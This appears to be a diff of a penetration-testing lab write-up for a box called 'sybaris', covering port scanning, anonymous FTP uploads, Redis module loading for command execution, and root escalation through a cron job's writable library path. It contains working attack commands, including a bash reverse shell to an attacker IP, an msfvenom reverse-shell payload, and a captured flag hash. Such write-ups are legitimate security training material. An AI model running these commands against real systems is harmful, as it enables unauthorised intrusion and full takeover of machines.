@@ -18,7 +18,7 @@ Nmap scan to enumerate open ports and services.
 ```bash
 nmap -sV -sC -A -O -p- --open -oN enum/fingerpring-scan.log $ip
 ```
-![[2025-08-31.png]]
+![](images/2025-08-31.png)
 **Nmap Scan Result**: 
 
 ### Open Ports & Services
@@ -29,13 +29,6 @@ nmap -sV -sC -A -O -p- --open -oN enum/fingerpring-scan.log $ip
 | 22/tcp   | open  | ssh     | OpenSSH 7.4                              |                      |
 | 80/tcp   | open  | http    | Apache httpd 2.4.6 ((CentOS) PHP/7.3.22) | Potential Web Vector |
 | 6379/tcp | open  | redis   | Redis key-value store 5.0.9              |                      |
-
-
-**Findings:**
-- **Port [PORT]:** [SERVICE] - [VERSION] ([NOTES])
-- **Port [PORT]:** [SERVICE] - [VERSION] <!-- This was the main attack vector -->
-    
-[https://images/1_nmap.png](https://images/1_nmap.png)
 
 <!-- Optional: Add a full port scan if necessary -->
 <!-- ### 1.2 Full Port Scan 
@@ -52,7 +45,7 @@ Browsing to http on port 80 has website build in with `HTMLy` but it's a rabbit 
 **Findings:**
 - `bablo` possible user.
 
-![[2025-08-31_1.png]]
+![](images/2025-08-31_1.png)
 
 ### 2.2 [FTP / 21] Enumeration
 ```bash
@@ -63,7 +56,7 @@ ls
 put filename.php
 ```
 FTP port 21 allows for anonymous login and was able to `put` write files into the public directory.
-![[2025-08-31_2.png]]
+![](images/2025-08-31_2.png)
 For now I know I have read and write permission on the ftp server. I uploaded test.php but when tried to access it on the port 80 it is not there. Not sure where it uploads so let move on to the next port which has`Redis` running on port `6379`
 
 ### 2.2 [Redis / 6379] Enumeration
@@ -86,7 +79,7 @@ ftp -p 192.168.195.93
 cd pub
 put module.so
 ```
-![[2025-08-31_4.png]]
+![](images/2025-08-31_4.png)
 
 **Redis Login**: using the `redis-cli` and load the module. 
 
@@ -101,39 +94,14 @@ Before running the command below we need to start a listener on the kali. `nc -l
 ```bash
 system.exec "/bin/bash -i >& /dev/tcp/192.168.45.247/6379 0>&1"
 ```
-![[2025-08-31_5.png]]
-### 2.4 User flag: 
+![](images/2025-08-31_5.png)
+
+### 3.4 User flag: 
 The `local.txt` was found under the user `pablo` which was observed on the http port 80 page at the bottom of the htmly blog. 
 ```bash
 b121bce5024edff1ba2031af87ff6c12
 ```
-![[2025-08-31_6.png]]
-
-### 3.1 [Vulnerability Name]
-
-[Explain the vulnerability you found. What is it? Why is it exploitable?]
-
-**Exploitation Steps:**
-
-1. Step 1 to trigger the vulnerability.
-2. Step 2 to exploit it.
-    
-# Code or command used to exploit
-```
-python3 exploit.py --target $ip
-```
-
-**Proof of Concept:**  
-[Show you got a shell or low-privilege access]
-
-[https://images/4_shell.png](https://images/4_shell.png)
-
-### 3.2 User Flag
-
-The user flag was located at [common path or specific path].
-```
-[user_flag_hash]
-```
+![](images/2025-08-31_6.png)
 
 ## 4. Privilege Escalation
 
@@ -142,16 +110,17 @@ Running `linpeas.sh` discovered /etc/crontab contains a root-run entry that runs
 ```
 linpeas.sh
 ```
-![[2025-08-31_7.png]]
+![](images/2025-08-31_7.png)
 ```bash
 cat /etc/crontab
 ```
 
-![[2025-08-31_9.png]]
+![](images/2025-08-31_9.png)
 
 We also note that this crontab file includes a custom `LD_LIBRARY_PATH` variable which adds **/usr/local/lib/utils** and **/usr/local/lib/dev** to the list of locations to search for library files. If we check these paths, we find that we only have write access to **/usr/local/lib/dev**, which is perfect for our use since it appears first in the path.
 
-![[2025-08-31_8.png]]
+![](images/2025-08-31_8.png)
+
 ```basj
 [pablo@sybaris tmp]$ ls -lah /usr/local/lib/dev
 total 0
@@ -167,7 +136,8 @@ drwxr-xr-x. 4 root root   30 Sep  7  2020 ..
 
 ```
 The list of shared objects loaded by **/usr/bin/log-sweeper** includes the **utils.so** shared object which may be a good candidate for hijacking.
-![[2025-08-31_10.png]]
+
+![](images/2025-08-31_10.png0
 
 ## 4.2 Exploit Cron Job
 To exploit out `log_sweeper` cron job, all we need to do is generate a milicious shared object file named `utils.so` and place it in the `/usr/local/lib/dev` directory. First, we'll generate out malicious payload shareed object `.so` file.
@@ -175,30 +145,37 @@ To exploit out `log_sweeper` cron job, all we need to do is generate a milicious
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=192.168.45.247 LPORT=6379
 ```
-![[2025-08-31_11.png]]
+![](images/2025-08-31_11.png)
+
 ### NC LISTENER:
 Start netcat listener to catch the reverse shell on port 6379
+
 ```bash
 nc -lvnp 6379
 ```
-![[2025-08-31_12.png]]
+![](images/2025-08-31_12.png)
 
 Upload the `utils.so` shared object to anonymous ftp. 
+
 ```bash
 ftp 192.168.195.93 # anonymous:anonymous
 cd pub
 put utils.so
 ```
 
-![[2025-08-31_13.png]]
+![](images/2025-08-31_13.png)
 
 Move payload `utils.so` to `/usr/local/lib/dev` directory
+
 ```bash
 cp /var/ftp/pub/utils.so /usr/local/lib/dev/utils.so
 ```
-![[2025-08-31_15.png]]
+![](images/2025-08-31_15.png)
+
 Finally, We wait for the cron job to execute, load our payload send us out reverse root shell. 
-![[2025-08-31_14.png]]
+
+![](images/2025-08-31_14.png)
+
 ### 4.3 Root Flag
 
 The root flag was located at /root/proof.txt
